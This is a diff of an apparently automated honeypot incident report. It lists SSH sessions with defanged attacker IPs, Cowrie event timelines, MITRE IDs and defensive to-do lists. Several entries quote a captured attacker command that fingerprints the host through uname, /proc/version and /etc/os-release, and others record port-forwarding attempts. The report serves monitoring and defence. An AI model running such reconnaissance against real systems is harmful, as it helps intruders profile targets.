 **Recommended Actions:**
-- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
-- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
+- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
+- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-0cb2db17f495
+### 🔴 HIGH · IR-e02c30318780
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
+| **First Seen** | 2026-08-22 16:50 |
+| **Last Seen** | 2026-08-22 16:50 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -6108,499 +4825,20 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 14:39:21` | `cowrie.session.connect` |
-| `2026-08-22 14:39:21` | `cowrie.client.version` |
-| `2026-08-22 14:39:21` | `cowrie.client.kex` |
-| `2026-08-22 14:39:22` | `cowrie.login.success` |
-| `2026-08-22 14:39:22` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:22` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:39:22` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:39:22` | `cowrie.session.closed` |
+| `2026-08-22 16:50:09` | `cowrie.session.connect` |
+| `2026-08-22 16:50:09` | `cowrie.client.version` |
+| `2026-08-22 16:50:09` | `cowrie.client.kex` |
+| `2026-08-22 16:50:10` | `cowrie.login.success` |
+| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:50:10` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
 - [ ] Block `217.60.255[.]130` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-06975f69c60d
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `65.20.204[.]88` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:39:29` | `cowrie.session.connect` |
-| `2026-08-22 14:39:29` | `cowrie.client.version` |
-| `2026-08-22 14:39:29` | `cowrie.client.kex` |
-| `2026-08-22 14:39:31` | `cowrie.login.success` |
-| `2026-08-22 14:39:31` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:35` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
-- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-f3a6c91b86bf
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:39:30` | `cowrie.session.connect` |
-| `2026-08-22 14:39:30` | `cowrie.client.version` |
-| `2026-08-22 14:39:31` | `cowrie.client.kex` |
-| `2026-08-22 14:39:31` | `cowrie.login.success` |
-| `2026-08-22 14:39:32` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:32` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:39:32` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:39:32` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-4f4c1429f0c2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:40 |
-| **Last Seen** | 2026-08-22 14:40 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:40:11` | `cowrie.session.connect` |
-| `2026-08-22 14:40:11` | `cowrie.client.version` |
-| `2026-08-22 14:40:11` | `cowrie.client.kex` |
-| `2026-08-22 14:40:14` | `cowrie.login.success` |
-| `2026-08-22 14:40:16` | `cowrie.session.params` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.success` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:16` | `cowrie.command.input` |
-| `2026-08-22 14:40:17` | `cowrie.log.closed` |
-| `2026-08-22 14:40:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-40a875b57836
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:42 |
-| **Last Seen** | 2026-08-22 14:42 |
-| **Session Duration** | 9s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:42:04` | `cowrie.session.connect` |
-| `2026-08-22 14:42:05` | `cowrie.client.version` |
-| `2026-08-22 14:42:05` | `cowrie.client.kex` |
-| `2026-08-22 14:42:07` | `cowrie.login.success` |
-| `2026-08-22 14:42:11` | `cowrie.session.params` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.success` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:11` | `cowrie.command.input` |
-| `2026-08-22 14:42:12` | `cowrie.log.closed` |
-| `2026-08-22 14:42:13` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-81d288bc3e48
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:44 |
-| **Last Seen** | 2026-08-22 14:44 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:44:04` | `cowrie.session.connect` |
-| `2026-08-22 14:44:05` | `cowrie.client.version` |
-| `2026-08-22 14:44:05` | `cowrie.client.kex` |
-| `2026-08-22 14:44:07` | `cowrie.login.success` |
-| `2026-08-22 14:44:09` | `cowrie.session.params` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.success` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:09` | `cowrie.command.input` |
-| `2026-08-22 14:44:11` | `cowrie.log.closed` |
-| `2026-08-22 14:44:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-56749d76b247
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:46 |
-| **Last Seen** | 2026-08-22 14:46 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:46:06` | `cowrie.session.connect` |
-| `2026-08-22 14:46:06` | `cowrie.client.version` |
-| `2026-08-22 14:46:06` | `cowrie.client.kex` |
-| `2026-08-22 14:46:09` | `cowrie.login.success` |
-| `2026-08-22 14:46:12` | `cowrie.session.params` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.success` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:12` | `cowrie.command.input` |
-| `2026-08-22 14:46:13` | `cowrie.log.closed` |
-| `2026-08-22 14:46:13` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8981752d10b6
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:48 |
-| **Last Seen** | 2026-08-22 14:48 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:48:10` | `cowrie.session.connect` |
-| `2026-08-22 14:48:10` | `cowrie.client.version` |
-| `2026-08-22 14:48:10` | `cowrie.client.kex` |
-| `2026-08-22 14:48:13` | `cowrie.login.success` |
-| `2026-08-22 14:48:15` | `cowrie.session.params` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.success` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:15` | `cowrie.command.input` |
-| `2026-08-22 14:48:16` | `cowrie.log.closed` |
-| `2026-08-22 14:48:16` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-50495a7ff6cf
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:49 |
-| **Last Seen** | 2026-08-22 14:49 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:49:27` | `cowrie.session.connect` |
-| `2026-08-22 14:49:27` | `cowrie.client.version` |
-| `2026-08-22 14:49:27` | `cowrie.client.kex` |
-| `2026-08-22 14:49:28` | `cowrie.login.success` |
-| `2026-08-22 14:49:28` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:49:28` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:49:28` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:49:29` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2b0de3ad2522
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:49 |
-| **Last Seen** | 2026-08-22 14:49 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:49:37` | `cowrie.session.connect` |
-| `2026-08-22 14:49:37` | `cowrie.client.version` |
-| `2026-08-22 14:49:38` | `cowrie.client.kex` |
-| `2026-08-22 14:49:38` | `cowrie.login.success` |
-| `2026-08-22 14:49:39` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:49:39` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:49:39` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:49:39` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-bf5edb75e727
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:50 |
-| **Last Seen** | 2026-08-22 14:50 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:50:13` | `cowrie.session.connect` |
-| `2026-08-22 14:50:14` | `cowrie.client.version` |
-| `2026-08-22 14:50:14` | `cowrie.client.kex` |
-| `2026-08-22 14:50:16` | `cowrie.login.success` |
-| `2026-08-22 14:50:18` | `cowrie.session.params` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.success` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:18` | `cowrie.command.input` |
-| `2026-08-22 14:50:20` | `cowrie.log.closed` |
-| `2026-08-22 14:50:21` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e102f94241c9
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `220.246.42[.]212` |
-| **First Seen** | 2026-08-22 14:52 |
-| **Last Seen** | 2026-08-22 14:53 |
-| **Session Duration** | 8s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:52:56` | `cowrie.session.connect` |
-| `2026-08-22 14:52:56` | `cowrie.client.version` |
-| `2026-08-22 14:52:56` | `cowrie.client.kex` |
-| `2026-08-22 14:52:58` | `cowrie.login.success` |
-| `2026-08-22 14:52:59` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:53:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `220.246.42[.]212` to AbuseIPDB if not already reported
-- [ ] Block `220.246.42[.]212` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1ca2d5bcbdb1
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `38.224.56[.]103` |
-| **First Seen** | 2026-08-22 14:53 |
-| **Last Seen** | 2026-08-22 14:53 |
-| **Session Duration** | 17s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:53:07` | `cowrie.session.connect` |
-| `2026-08-22 14:53:09` | `cowrie.client.version` |
-| `2026-08-22 14:53:09` | `cowrie.client.kex` |
-| `2026-08-22 14:53:16` | `cowrie.login.success` |
-| `2026-08-22 14:53:24` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:53:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `38.224.56[.]103` to AbuseIPDB if not already reported
-- [ ] Block `38.224.56[.]103` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-dd7ef8fe3418
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]232` |
-| **First Seen** | 2026-08-22 14:54 |
-| **Last Seen** | 2026-08-22 14:54 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:54:15` | `cowrie.session.connect` |
-| `2026-08-22 14:54:15` | `cowrie.client.version` |
-| `2026-08-22 14:54:15` | `cowrie.client.kex` |
-| `2026-08-22 14:54:18` | `cowrie.login.success` |
-| `2026-08-22 14:54:20` | `cowrie.session.params` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.success` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:20` | `cowrie.command.input` |
-| `2026-08-22 14:54:21` | `cowrie.log.closed` |
-| `2026-08-22 14:54:22` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
 ---
@@ -6612,29 +4850,29 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
 |---|---|---|---|---|---|---|---|
-| `66.132.224[.]235` | **5** | 2026-08-22 13:54 | 2026-08-22 13:55 | 0m | 0 | `T1592` | 🟢 LOW |
-| `139.199.80[.]137` | **4** | 2026-08-22 13:13 | 2026-08-22 14:33 | 0m | 0 | `T1592` | 🟢 LOW |
-| `136.55.4[.]174` | **3** | 2026-08-22 13:01 | 2026-08-22 13:03 | 0m | 0 | `T1592` | 🟢 LOW |
-| `66.132.172[.]179` | **3** | 2026-08-22 13:55 | 2026-08-22 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
-| `66.132.172[.]209` | **3** | 2026-08-22 13:55 | 2026-08-22 13:57 | 0m | 0 | `T1592` | 🟢 LOW |
-| `18.116.101[.]220` | **2** | 2026-08-22 14:15 | 2026-08-22 14:20 | 0m | 0 | `T1592` | 🟢 LOW |
-| `195.178.110[.]232` | **2** | 2026-08-22 14:31 | 2026-08-22 14:52 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
-| `40.124.186[.]160` | **2** | 2026-08-22 14:20 | 2026-08-22 14:20 | 0m | 0 | `T1592` | 🟢 LOW |
-| `77.239.124[.]117` | **2** | 2026-08-22 14:08 | 2026-08-22 14:08 | 0m | 2 | `T1110.001` | 🟢 LOW |
